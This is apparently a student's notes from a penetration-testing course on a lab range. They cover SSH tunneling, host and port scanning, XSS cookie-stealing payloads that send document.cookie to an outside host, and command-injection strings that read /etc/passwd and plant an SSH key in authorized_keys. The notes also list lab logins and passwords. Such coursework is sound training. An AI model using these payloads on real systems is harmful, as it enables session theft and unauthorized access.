# Day 1 

https://vta.cybbh.space/horizon/project/


https://sec.cybbh.io/public/security/latest/index.html

CTFD Server: http://10.50.20.250:8000	
User: NIRI-505-M  
Pass: gVN5chrkxW0bym1 	

Gray host: 10.50.34.77


LinOps:

ssh -X student@10.50.22.235
password1

Winops:

xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.29.77


Penetration Testing:



Scanning and Reconnaissance:


Scrapping Data:




       1. Host Discovery
        ◦ Find hosts that are online
    2. Port Enumeration
        ◦ Find ports for each host that is online
    3. Port Interrogation
        ◦ Find what service is running on each open/available port
	netstat -natup

Scripts are stored in a subdirectory of the Nmap data directory by default:

/usr/share/nmap/scripts



Vulnerability and Exploitation Research:






Master Sockets:

All traffic sent through /tmp/gray file will be sent to the 10.50.34.77 IP address. 

	ssh -MS /tmp/gray student@10.50.34.77 

Dynamic Tunnel:

	ssh -S /tmp/gray gray -O forward -D 9050

Canceling a Dynamic Tunnel 

	ssh -S /tmp/gray gray -O cancel -D 9050

HOST DISCOVERY:

One-line ping-sweep

	for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done


Post Enumeration:

	proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.111,120

Enumeration nmap script: 

	proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80


Local Port Forward using master Socket:

	ssh -S /tmp/gray gray -O forward -L 41201:192.168.28.111:80


	ssh -S /tmp/gray gray -O forward -L 41202:192.168.28.111:2222

Master Socket through another Master Socket:

	ssh -MS /tmp/comrade comrade@127.0.0.1 -p 41202

# Day2 
## Web Exploitation (XSS)


 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
HTTP Response Codes

    10X == Informational

    2XX == Success

    30X == Redirection

    4XX == Client Error

    5XX == Server Error




HTTP Fields

    User-Agent

    Referer

    Cookie

    Date

    Server

    Set-Cookie



WGET 

	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php


# XSS Demos

Alert Script:

	<script>alert('XSS');</script>


Run on ops station:

	 python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Run on the webserver to send cookies back to my page:
	
 	<script>document.location="http://10.50.22.235:8000/"+document.cookie;</script>


## Command injection 
* Find users home directory and type of shell.

		; whomai
	 	; cat../../../etc/passwd 
  


* Generate and ssh key

 	 	ssh-keygen -t rsa -b 4096
* Inject public key into website
* Make .ssh folder in home directory

		;ls -la /users/home/directory      #check if .ssh exists
		; mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exis

* Make authorized key file in .ssh

		 ; echo "your_public_key_here" > /users/home/directory/.ssh/authorized_keys


* Verify key has been uploaded successfully.

		 ; cat /users/home/directory/.ssh/authorized_keys

* ssh onto the box:

   		ssh user@ip_addr
  Shouldn't prompt for password. If it does, your wrong. 

* Authenticating with a private key that was found:

  		ssh -i user_rsa.priv user@ip

 * Webserver info is stored

		/var/www/html


# Reverse Engineering:

run file command on the file.



